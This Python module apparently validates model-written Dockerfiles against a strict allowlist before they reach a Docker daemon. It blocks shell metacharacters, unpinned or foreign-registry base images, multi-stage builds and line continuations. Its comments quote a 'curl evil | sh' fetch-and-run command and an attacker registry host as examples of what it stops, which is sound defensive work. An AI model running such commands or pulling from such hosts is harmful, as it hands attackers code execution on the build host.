"""The deterministic gate. Nothing reaches the daemon without passing this.

An allowlist of permitted instructions, never a blocklist of forbidden ones. A
blocklist is defeated by the first form nobody thought of, and the thing being
checked was written by a model that had just read attacker-controlled text.

Returns a reason to refuse, or None to allow. The reason is shown to the model as
repair evidence, so it says what is wrong rather than merely that something is.
"""

from __future__ import annotations

import json

INSTRUCTIONS = ("FROM", "COPY", "RUN", "USER", "CMD", "ENTRYPOINT")

# Anything that lets one RUN become two commands, read a file, write a file, or
# expand into something else. The allowlist below would be meaningless without this,
# since `apt-get update && curl evil | sh` starts with an allowed prefix.
SHELL_METACHARACTERS = "&|;$`><()\n\r"

RUN_PREFIXES = (
    "pip install",
    "pip3 install",
    "python -m pip install",
    "apt-get update",
    "apt-get install",
)


def _reason(number: int, line: str, problem: str) -> str:
    return f"line {number}, {line.strip()!r}: {problem}"


def _check_from(number: int, line: str, base_image: str) -> str | None:
    parts = line.split()
    if len(parts) != 2:
        # Catches multi-stage builds too. `FROM x AS builder` is four tokens, and a
        # second stage can COPY --from= anything the first stage produced.
        return _reason(number, line, "FROM takes exactly one image and nothing else")
    reference = parts[1]
    if reference != base_image:
        return _reason(number, line,
                       f"FROM must be the declared base_image {base_image!r}")
    if "@" in reference:
        # A digest pins harder than a tag but pins to one architecture, so an image
        # that builds on arm64 fails on the amd64 runner.
        return _reason(number, line, "pin with a tag, not a digest")
    segments = reference.split("/")
    if len(segments) > 2:
        return _reason(number, line, "too many path segments for a Docker Hub image")
    if len(segments) == 2 and ("." in segments[0] or ":" in segments[0]):
        # `evil.attacker.com/img:1` is a valid reference, and building it would make
        # the daemon pull from a host the attacker chose.
        return _reason(number, line, "no registry host, Docker Hub images only")
    name = segments[-1]
    if ":" not in name:
        return _reason(number, line, "FROM needs an explicit tag")
    tag = name.rsplit(":", 1)[1]
    if not tag:
        return _reason(number, line, "FROM needs an explicit tag")
    if tag == "latest":
        return _reason(number, line, "latest is not a pin, name a version")
    return None


def _check_copy(number: int, line: str, allowed_files: frozenset[str]) -> str | None:
    parts = line.split()
    if len(parts) != 3:
        return _reason(number, line, "COPY takes exactly a source and a destination")
    source = parts[1]
    if source not in allowed_files:
        return _reason(number, line,
                       f"COPY may only name {', '.join(sorted(allowed_files))}")
    return None


def _check_run(number: int, line: str) -> str | None:
    command = line[len("RUN"):].strip()
    if not command:
        return _reason(number, line, "RUN needs a command")
    found = next((c for c in SHELL_METACHARACTERS if c in command), None)
    if found is not None:
        return _reason(number, line,
                       f"no shell metacharacters in RUN, found {found!r}. "
                       "Use one RUN per command")
    if not any(command == p or command.startswith(p + " ") for p in RUN_PREFIXES):
        return _reason(number, line,
                       f"RUN must start with one of: {', '.join(RUN_PREFIXES)}")
    return None


def _check_exec_form(number: int, line: str, keyword: str) -> str | None:
    rest = line[len(keyword):].strip()
    try:
        parsed = json.loads(rest)
    except json.JSONDecodeError:
        # Shell form re-splits inside `/bin/sh -c`, which is the string-versus-list
        # problem the sandbox already refuses to make with the docker command itself.
        return _reason(number, line, f"{keyword} must be exec form, a JSON array")
    if not isinstance(parsed, list) or not parsed:
        return _reason(number, line, f"{keyword} must be a non-empty JSON array")
    if not all(isinstance(item, str) for item in parsed):
        return _reason(number, line, f"{keyword} array must hold only strings")
    return None


def check(dockerfile: str, base_image: str,
          allowed_files: frozenset[str]) -> str | None:
    """Allow, or say why not.

    Continuations are refused before anything else, which is what makes every later
    rule sound: with no continuations each physical line is a whole instruction, so a
    per-line allowlist cannot be walked past by an instruction that starts on one line
    and does its work on the next.
    """
    if not dockerfile.strip():
        return "the Dockerfile is empty"

    seen_from = False
    seen_command = False

    for number, line in enumerate(dockerfile.splitlines(), start=1):
        if line.rstrip().endswith("\\"):
            return _reason(number, line, "no line continuations, one instruction per line")
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue

        keyword = stripped.split(maxsplit=1)[0].upper()
        if keyword not in INSTRUCTIONS:
            return _reason(number, line,
                           f"{keyword} is not allowed. Permitted: {', '.join(INSTRUCTIONS)}")
        if keyword == "FROM":
            if seen_from:
                return _reason(number, line, "only one FROM, no multi-stage builds")
            problem = _check_from(number, stripped, base_image)
            if problem:
                return problem
            seen_from = True
            continue
        if not seen_from:
            return _reason(number, line, "FROM must be the first instruction")

        if keyword == "COPY":
            problem = _check_copy(number, stripped, allowed_files)
        elif keyword == "RUN":
            problem = _check_run(number, stripped)
        elif keyword == "USER":
            problem = (None if len(stripped.split()) == 2
                       else _reason(number, line, "USER takes exactly one name"))
        else:
            problem = _check_exec_form(number, stripped, keyword)
            seen_command = seen_command or problem is None
        if problem:
            return problem

    if not seen_from:
        return "the Dockerfile has no FROM"
    if not seen_command:
        return "the Dockerfile has no CMD or ENTRYPOINT, so the image runs nothing"
    return None
